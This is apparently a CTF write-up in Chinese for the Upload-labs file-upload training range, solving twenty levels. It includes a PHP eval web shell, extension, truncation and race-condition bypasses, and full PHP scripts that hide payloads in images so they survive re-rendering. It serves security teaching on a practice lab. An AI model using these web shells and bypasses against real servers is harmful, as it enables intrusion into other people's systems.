---
title: Upload-labs-Writeup
date: April 16th 2019
tags: [CTF, 文件上传, Web安全, Writeup]
summary: Upload-labs 文件上传漏洞靶场完整 Writeup，系统覆盖 JS 绕过、MIME 类型伪造、.htaccess 解析、文件名截断等各类绕过技巧。
---

# Upload-labs-Writeup

- Upload-labs 项目地址

## 基础知识

**靶机包含漏洞类型分类**

![漏洞类型](https://github.com/c0ny1/upload-labs/raw/master/doc/mind-map.png)

**如何判断上传漏洞类型**

![判断上传漏洞类型](https://github.com/c0ny1/upload-labs/raw/master/doc/sum_up.png)

## Upload

### Pass-01

尝试上传了一个PHP，反应很快弹出格式要求窗口。再根据网页源码判断，应该是使用了JS判断。

1. 用Brupsuite抓包
2. 然后将filename修改为“shell.php”
3. 在文件内容里添加<?php eval($_POST[three])?>
4. 上传之后用菜刀连接

这个除了js之外都没有什么检查。

### Pass-02

和第一关一样，尝试了一个php后，提示：文件类型不正确，请重新上传！

并没有发现相关的JS代码，所以应该是在服务端检查。

和第一关一样的步骤。

1. 用Brupsuite抓包
2. 然后将filename修改为“shell.php”
3. 在文件内容里添加<?php eval($_POST[three])?>
4. 上传之后用菜刀连接

看了源码后发现：

`if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'))`

它只判断了数据包的MIME。却没有对后缀名进行检查。

### Pass-03

上传一个php，提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！ 属于黑名单类型。

这里需要上传特殊可解析后缀，

例如`.phtml` 或者 `.php2`

两种类型都上传成功，但是没有被解析。

可能是由于我配置的缘故，没有成功被解析。orz，不敢再继续配置下去了。

这里收集了一些可被PHP解析器解析执行的后缀名：

- `.php*`类:
  - .php. ubuntu 12.04 lts LAMP bypass with .php.
  - .php3
  - .php4
  - .php5
  - .php6
  - .php7
- `.ph*`类
  - .pht
  - .phtm
  - .phtml
- 解析漏洞类
  - .php.gif
  - .jpg%00.php

### Pass-04

尝试上传了一个不存在的后缀名，上传成功，应该是使用了黑名单。

查看了提示之后发现，黑名单列举了几乎所有能使用的格式。

尝试上传.htaccess文件？

```plain
<FilesMatch "evil.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

可以将evil.jpg文件解析为php

另一种方式：

1. 上传一个evil.php:.jpg文件，上传目录下会存在一个evil.php的空文件
2. 上传一个evil.<或evil.<<<或evil.>>>或evil.>><后再次上传，重写evil.php
3. 菜刀链接

### Pass-05

会对文件进行重命名，所以无法用第四关的第二种方法。

这里得用大小写绕过，上传一个.PHp或者其他名称都行。

### Pass-06

增加点和空格，写成 `evil.php. `

但是这样上传之后只会变成没有后缀的文件名，可能只是环境的问题。

### Pass-07

禁止了一切可执行的后缀

用第6题的方法，在后缀名的地方加点。

很奇怪的是，这个却成功写入了，第六题却不行。

从源码来看：

第六题多了一个函数：`$file_name = deldot($file_name);//删除文件名末尾的点`

第七题没有这个函数，所以不用加点。

### Pass-08

使用Windows文件流特性绕过

1. 文件名改成 evil.php::$DATA
2. 上传后的图片名称为：evil.php(这题会变成修改图片名，但后缀都是php)

### Pass-09

同第6关，修改后缀名为：`evil.php. .`

上传后的文件名为php

从源码来看：

相比第六关，多了一个`$file_ext = trim($file_ext); //首尾去空`

当`. .`先去了一个点，再首尾去空，就和第七关一样只剩下一个点成功上传。

### Pass-10

从源码上看，会删除黑名单的存在的后缀。双写绕过

上传文件名改为：`evil.phphpp`

### Pass-11

这个漏洞比较鸡肋。利用的环境得先有两个条件：

1. PHP版本小于5.3.4
2. PHP的magic_quotes_gpc为OFF状态

这里利用的是%00截断。

可知：

1. 文件保存的路径可控
2. 文件上传时文件名可控

于是在路径处，将`../upload/`改为：`../upload/evil.php%00`

文件名为正常的jpg后缀，上传后可得到：`../upload/evil.php`

因为写入文件时，读到%00会当做结束符而把后面的数据直接忽略，所以就生成了evil.php

### Pass-12

和11关一样的使用截断绕过，但这里是利用Brupsuite的Hex功能。

1. 在保存的路径处，将../upload/改为：../upload/evil.php (注意这里有个空格)
2. 使用Brupsuite的Hex，将对应空格处的20改为00
3. 上传

### Pass-13

这一关的任务好像增加了呀，要.jpg,.png,.gif都上传成功才算过关。

1. GIF图片格式最简单：`GIF89a<?php phpinfo(); ?>` .gif后缀上传即可
2. JPG：
  - 准备一个一句话，一个jpg图片
  - 使用：copy 1.jpg /b + 2.php /a evil.jpg生成一个带有一句话的jpg
3. PNG：和JPG一样的操作

### Pass-14

提示：本pass使用getimagesize()检查是否为图片文件！

和13关是一样的。

### Pass-15

提示：本pass使用exif_imagetype()检查是否为图片文件！

和13关是一样的。

### Pass-16

提示：本pass重新渲染了图片！

这里就是DDCTF第三题的考点，图片的二次渲染。

- GIF的图的又是最简单的：
  - 寻找到一个渲染后没有发生变化的部分
  - 将恶意代码插入
(这里可以使用Brupsuite来对比两个图片的数据，然后寻找到没有改变的区域)
- PNG：
  - 这里可以直接用国外的脚本

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

用php运行后得到1.png上传即可。

- JPG：

JPG也是可以直接使用国外的脚本生成

使用方法：

1. 先将JPG图片上传渲染一次
2. 下载下来，使用脚本：php xuanran.php 1.jpg
3. 得到pyload图片再上传

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";

    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>

```

### Pass-17

提示需要代码审计：

查看源码。

这里先会把文件上传，上传成功之后开始判断后缀，如果后缀不合法，则删除文件。合法的话就更改名称。

这里使用的方法是条件竞争删除时间差绕过，在文件还没被删除的时候访问到evil.php

1. 上传evil.php文件
2. 用Brupsuite抓包
3. 用Brupsuite的测试器，将线程数调整到20以上，提交数据包
4. 访问evil.php

### Pass-18

这一关需要利用上传重命名竞争+Apache解析漏洞。

和第17关一样，先上传，后判断，并修改文件名。

1. 上传evil.php.7Z文件
2. 用Brupsuite抓包
3. 用Brupsuite的测试器，将线程数调整到20以上，提交数据包

成功的时候会提示：文件已经被上传，但没有重命名。

可能是这个lab的源码有问题，直接上传文件名会导致文件名变为”uploadevil.php.7Z”

将文件名改为”/evil.php.7Z”上传即可

成功之后访问”evil.php.7Z”。

### Pass-19

和12关一样的解法，这里是通过`$_POST`方法来获取文件名。

1. 将evil.php改为：evil.php 1.jpg(注意这里有个空格)
2. 使用Brupsuite的Hex，将对应空格处的20改为00
3. 上传

就可以访问。

### Pass-20

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];//判断save_name是否被定义，定义的话就用save_name
        if (!is_array($file)) {//这里判断了file是否为数组
            $file = explode('.', strtolower($file));//将文件名按.分割开
        }

        $ext = end($file);//取最后一个，即文件的后缀名
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];//输出第一个值加个点，再读最后一个。
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}

```

源码进行了以下事情：

1. 检查MIME
2. 检查后缀名(这里全部化为了小写)
3. 都通过之后再保存文件

使用以下POST数据绕过：

```plain
Content-Length: 537
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------46491466030493
Content-Disposition: form-data; name="upload_file"; filename="phpinfo.php"
Content-Type: image/jpeg

<?php phpinfo();?>
-----------------------------46491466030493
Content-Disposition: form-data; name="save_name[0]"

phpinfo.php/
-----------------------------46491466030493
Content-Disposition: form-data; name="save_name[2]"

jpg
-----------------------------46491466030493
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------46491466030493--
```

分析，由于他在前面加了一个判断数组的if语句，于是可以赋值给sava_name[0]，和sava_name[2]的值分别为：phpinfo.php/ 和 jpg。

此时的sava_name的值为：

这样在最后的file_name赋值的时候就为：phpinfo.php/.jpg

通过move_uploaded_file，最终上传的文件名为phpinfo.php

## 总结

根据lab提供的图片又总结了一下。

![总结](https://i.loli.net/2019/04/19/5cb9e25491567.png)